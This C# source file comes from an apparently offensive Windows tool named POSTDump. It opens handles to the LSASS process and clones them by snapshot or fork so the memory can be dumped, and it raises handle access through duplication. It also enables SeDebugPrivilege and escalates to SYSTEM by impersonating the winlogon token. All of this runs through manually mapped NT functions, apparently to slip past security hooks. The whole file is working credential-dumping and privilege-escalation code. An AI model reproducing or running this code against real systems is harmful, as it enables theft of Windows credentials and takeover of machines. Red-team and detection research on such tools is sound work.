using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Data = DCall.Data;
using DInvoke = DCall.DynamicInvoke;
using ManualMap = DCall.ManualMap;

namespace POSTDump
{
    public class Handle
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        internal static extern bool PssFreeSnapshot(IntPtr ProcessHandle, IntPtr SnapshotHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool NtClose(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.Native.NTSTATUS NtCreateProcessEx(out IntPtr ProcesDumpHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ParentProcess, [In, MarshalAs(UnmanagedType.U1)] bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.Native.NTSTATUS NtOpenProcess(ref IntPtr processHandle, uint desiredAccess, ref Data.Native.OBJECT_ATTRIBUTES objectAttributes, ref Data.Native.CLIENT_ID clientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.Native.NTSTATUS PssNtCaptureSnapshot(out IntPtr SnapshotHandle, IntPtr ProcessHandle, uint CaptureFlags, uint ThreadContextFlags);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int PssNtQuerySnapshot(IntPtr SnapHandle, uint flags, out IntPtr hCLoneProcess, uint BufferLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.Native.NTSTATUS NtDuplicateObject(IntPtr SourceProcessHandle, IntPtr SourceHandle, IntPtr TargetProcessHandle, out IntPtr TargetHandle, uint DesiredAccess, uint HandleAttr, uint Options);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.Native.NTSTATUS NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool LookupPrivilegeValueA(string host, string name, ref Data.Win32.WinNT._LUID pluid);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.Native.NTSTATUS NtTerminateProcess(IntPtr handle, Data.Native.NTSTATUS ExitStatus);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.Native.NTSTATUS NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref Data.Win32.WinNT._TOKEN_PRIVILEGES newstn, UInt32 bufferlength, IntPtr prev, IntPtr relen);

        //[UnmanagedFunctionPointer(CallingConvention.StdCall)]
        //delegate Data.Native.NTSTATUS NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

        //[UnmanagedFunctionPointer(CallingConvention.StdCall)]
        //delegate Data.Native.NTSTATUS NtDuplicateToken(IntPtr ExistingTokenHandle, uint DesiredAccess, ref Data.Native.OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, Data.Win32.WinNT.TOKEN_TYPE TokenType, out IntPtr NewTokenHandle);

        public static bool kill_process(uint pid, IntPtr procHandle, Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            if (pid != 0)
            {
                procHandle = IntPtr.Zero;
                IntPtr stub2 = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtOpenProcess");
                NtOpenProcess NTOP = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub2, typeof(NtOpenProcess));
                Data.Native.OBJECT_ATTRIBUTES oa = new Data.Native.OBJECT_ATTRIBUTES();
                Data.Native.CLIENT_ID ci = new Data.Native.CLIENT_ID()
                {
                    UniqueProcess = (IntPtr)pid,
                };

                NTOP(ref procHandle, (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_TERMINATE, ref oa, ref ci);
            }

            if (procHandle == IntPtr.Zero)
            {
                return false;
            }

            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtTerminateProcess");
            NtTerminateProcess NTTP = (NtTerminateProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtTerminateProcess));
            Data.Native.NTSTATUS status = NTTP(procHandle, 0x00000000);
            if (status != Data.Native.NTSTATUS.Success)
            {
                Console.WriteLine("Failed killed process while cleanup.");
                return false;
            }

            return true;
        }

        public static void cleanup(IntPtr dumpHandle, string tech, Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            if (tech == "snapshot")
            {
                PssFreeSnapshot(Process.GetCurrentProcess().Handle, dumpHandle);
            }
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtClose");
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
            NTC(dumpHandle);
        }

        public static bool GetLsassHandle(IntPtr pid, out IntPtr procHandle, uint permissions, Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            procHandle = IntPtr.Zero;
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtOpenProcess");
            NtOpenProcess NTOP = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));
            Data.Native.OBJECT_ATTRIBUTES oa = new Data.Native.OBJECT_ATTRIBUTES();
            Data.Native.CLIENT_ID ci = new Data.Native.CLIENT_ID()
            {
                UniqueProcess = (IntPtr)pid,
            };

            NTOP(ref procHandle, permissions, ref oa, ref ci);
            if (procHandle == IntPtr.Zero)
            {
                return false;
            }

            return true;
        }

        public static unsafe bool Snapshot(IntPtr procHandle, out IntPtr dumpHandle, Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            dumpHandle = IntPtr.Zero;
            IntPtr tempHandle = IntPtr.Zero;
            
            IntPtr stubex = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "PssNtCaptureSnapshot");
            PssNtCaptureSnapshot NTCS = (PssNtCaptureSnapshot)Marshal.GetDelegateForFunctionPointer(stubex, typeof(PssNtCaptureSnapshot));

            Data.Native.NTSTATUS hresult = NTCS(out tempHandle, procHandle, (uint)Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE, (uint)0);
            if (tempHandle == IntPtr.Zero)
            {
                Console.WriteLine("PssNtCaptureSnapshot failed.");
                return false;
            }
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtClose");
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
            NTC(procHandle);

            IntPtr stub2 = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "PssNtQuerySnapshot");
            PssNtQuerySnapshot NTQS = (PssNtQuerySnapshot)Marshal.GetDelegateForFunctionPointer(stub2, typeof(PssNtQuerySnapshot));
            NTQS(tempHandle, (uint)Data.Native.PSS_QUERY_INFORMATION_CLASS.PSS_QUERY_VA_CLONE_INFORMATION, out dumpHandle, (uint)IntPtr.Size);
            NTC(tempHandle);
            
            if (dumpHandle == IntPtr.Zero)
            {
                return false;
            }

            return true;
        }

        public static bool Fork(IntPtr procHandle, out IntPtr dumpHandle, Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            dumpHandle = IntPtr.Zero;
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtCreateProcessEx");
            NtCreateProcessEx NTCP = (NtCreateProcessEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateProcessEx));
            NTCP(out dumpHandle, (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, IntPtr.Zero, procHandle, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
           
            if (dumpHandle == IntPtr.Zero)
            {
                return false;
            }

            stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtClose");
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
            NTC(procHandle);
            return true;
        }

        public static bool ElevateHandle(IntPtr hProcess, uint desiredAccess, UInt32 HandleAttributes, Data.PE.PE_MANUAL_MAP moduleDetails, out IntPtr hHighPriv)
        {
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtDuplicateObject");
            NtDuplicateObject NTDO = (NtDuplicateObject)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtDuplicateObject));

            IntPtr hDupPriv = IntPtr.Zero;
            hHighPriv = IntPtr.Zero;
            uint options = 0;
            HandleAttributes = 0;

            Data.Native.NTSTATUS status = NTDO(GetCurrentProcess(), hProcess, GetCurrentProcess(), out hDupPriv, (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_DUP_HANDLE, 0, 0);

            if (hDupPriv == IntPtr.Zero)
            {
                cleanup(hProcess, String.Empty, moduleDetails);
                return false;
            }

            NTDO(hDupPriv, GetCurrentProcess(), GetCurrentProcess(), out hHighPriv, desiredAccess, HandleAttributes, options);
            if (hHighPriv == IntPtr.Zero)
            {
                cleanup(hDupPriv, String.Empty, moduleDetails);
                cleanup(hProcess, String.Empty, moduleDetails);
                return false;
            }

            cleanup(hDupPriv, String.Empty, moduleDetails);
            cleanup(hProcess, String.Empty, moduleDetails);
            return true;
        }

        static bool EnableDebugPrivilege(Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            IntPtr TokenHandle = IntPtr.Zero;
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtOpenProcessToken");
            NtOpenProcessToken NTOPT = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcessToken));

            IntPtr stub2 = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtClose");
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(stub2, typeof(NtClose));

            bool retVal;
            Data.Win32.WinNT._TOKEN_PRIVILEGES tp = new Data.Win32.WinNT._TOKEN_PRIVILEGES();
            IntPtr htok = IntPtr.Zero;
            NTOPT(GetCurrentProcess(), 0x0020 | 0x0008, out htok); // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            if (htok == IntPtr.Zero)
            {
                return false;
            }

            tp.PrivilegeCount = 1;
            tp.Privileges.Attributes = 0x00000002;

            Data.PE.PE_MANUAL_MAP moduleDetails2 = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\Advapi32.dll");
            stub = DInvoke.Generic.GetExportAddress(moduleDetails2.ModuleBase, "LookupPrivilegeValueA");
            LookupPrivilegeValueA LookupPrivValueA = (LookupPrivilegeValueA)Marshal.GetDelegateForFunctionPointer(stub, typeof(LookupPrivilegeValueA));
            retVal = LookupPrivValueA(null, "SeDebugPrivilege", ref tp.Privileges.Luid);
            if (!retVal)
            {
                Console.WriteLine("LookupPriv failed.");
                NTC(htok);
                return false;
            }

            stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtAdjustPrivilegesToken");
            NtAdjustPrivilegesToken NTAPT = (NtAdjustPrivilegesToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAdjustPrivilegesToken));
            Data.Native.NTSTATUS status = NTAPT(htok, false, ref tp, (uint)Marshal.SizeOf(typeof(Data.Win32.WinNT._TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
            if (status != Data.Native.NTSTATUS.Success)
            {
                NTC(htok);
                return false;
            }

            NTC(htok);
            return true;
        }

        public static bool escalate_to_system(Data.PE.PE_MANUAL_MAP moduleDetails)
        {
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtOpenProcessToken");
            NtOpenProcessToken NTOPT = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcessToken));

            IntPtr stub2 = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtClose");
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(stub2, typeof(NtClose));

            bool res = EnableDebugPrivilege(moduleDetails);
            if (!res)
            {
                Console.WriteLine("SeDebugPrivilege failed");
                return false;
            }

            Process[] processlist = Process.GetProcesses();
            Process proc = new Process();
            IntPtr tokenHandle = IntPtr.Zero;
            uint TOKEN_READ = 0x00020000 | 0x0008; // STANDARD_RIGHTS_READ | TOKEN_QUERY
            uint TOKEN_IMPERSONATE = 0x0004;
            uint TOKEN_DUPLICATE = 0x0002;
            Data.Native.NTSTATUS status;
            foreach (Process theProcess in processlist)
            {
                if (theProcess.ProcessName == "winlogon")
                {
                    proc = theProcess;
                    break;
                }
            }

            status = NTOPT(proc.Handle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out tokenHandle);
            if (status != Data.Native.NTSTATUS.Success)
            {
                Console.WriteLine("NtOpenProcessToken Failed!");
                return false;
            }

            bool token = ImpersonateLoggedOnUser(tokenHandle);
            if (!token)
            {
                Console.WriteLine("GetSystem Failed! ");
                return false;
            }

            NTC(proc.Handle);
            NTC(tokenHandle);

            return true;
        }
    }
}
